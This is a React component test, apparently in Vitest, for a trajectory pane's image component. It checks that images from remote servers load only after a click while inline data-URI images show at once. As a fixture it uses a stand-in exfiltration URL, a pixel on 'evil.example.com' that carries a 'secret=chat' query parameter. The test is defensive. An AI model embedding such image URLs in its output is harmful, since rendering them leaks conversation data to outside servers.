// @vitest-environment jsdom
// An image the trajectory pane shows from someone else's server waits for a
// click, like one in a reply; one already on this machine shows at once.
import { cleanup, fireEvent, render } from '@testing-library/react'
import { afterEach, describe, expect, it } from 'vitest'
import type { TrajectorySourceBlock } from '../src/client/trajectory-record.ts'
import { PanelImage } from '../src/client/TrajectoryTable.tsx'

afterEach(cleanup)

const block = (imageSrc: string): TrajectorySourceBlock => ({ type: 'image', content: '', imageSrc })

describe('an image in the trajectory pane', () => {
  it('asks no server until the person clicks', () => {
    const { container } = render(<PanelImage block={block('https://evil.example.com/pixel.png?secret=chat')} />)
    expect(container.querySelector('img')).toBeNull()
    fireEvent.click(container.querySelector('[data-remote-image]')!)
    expect(container.querySelector('img')?.getAttribute('src')).toBe('https://evil.example.com/pixel.png?secret=chat')
  })

  it('shows an image carried in the request itself straight away', () => {
    const { container } = render(<PanelImage block={block('data:image/png;base64,AAAA')} />)
    expect(container.querySelector('img')?.getAttribute('src')).toBe('data:image/png;base64,AAAA')
    expect(container.querySelector('[data-remote-image]')).toBeNull()
  })
})
